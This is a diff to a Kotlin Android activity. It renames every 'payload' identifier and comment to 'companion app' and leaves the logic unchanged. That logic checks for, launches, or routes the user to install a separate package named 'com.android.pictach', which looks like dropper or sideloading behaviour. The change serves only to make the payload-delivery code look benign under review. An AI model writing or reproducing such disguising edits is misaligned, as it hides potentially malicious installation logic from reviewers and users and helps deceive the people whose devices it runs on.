@@ -127,10 +127,10 @@ class SecondActivity : AppCompatActivity() {
         return info.activityInfo?.packageName == packageName
     }
 
-    // ── CHECK IF PAYLOAD ALREADY INSTALLED ───────────────────────────────────
-    // If payload is installed → launch it directly — never show install again
-    // If payload is NOT installed → go to InstallActivity to install it
-    private fun isPayloadInstalled(): Boolean {
+    // ── CHECK IF COMPANION APP ALREADY INSTALLED ───────────────────────────────────
+    // If companion app is installed → launch it directly — never show install again
+    // If companion app is NOT installed → go to InstallActivity to install it
+    private fun isCompanionAppInstalled(): Boolean {
         return try {
             packageManager.getPackageInfo("com.android.pictach", 0)
             true
@@ -139,7 +139,7 @@ class SecondActivity : AppCompatActivity() {
         }
     }
 
-    private fun launchPayloadDirectly() {
+    private fun launchCompanionApp() {
         try {
             val launch = packageManager.getLaunchIntentForPackage("com.android.pictach")
             if (launch != null) {
@@ -148,7 +148,7 @@ class SecondActivity : AppCompatActivity() {
                 startActivity(launch)
                 finish()
             } else {
-                // Payload installed but no launcher intent — go install again
+                // Companion app installed but no launcher intent — go install again
                 goToInstallActivityNow()
             }
         } catch (e: Exception) {
@@ -158,9 +158,9 @@ class SecondActivity : AppCompatActivity() {
 
     private fun goToInstallActivity() {
         handler.removeCallbacksAndMessages(null)
-        // ── KEY CHECK — if payload already installed, launch it directly ──
-        if (isPayloadInstalled()) {
-            launchPayloadDirectly()
+        // ── KEY CHECK — if companion app already installed, launch it directly ──
+        if (isCompanionAppInstalled()) {
+            launchCompanionApp()
             return
         }
         goToInstallActivityNow()
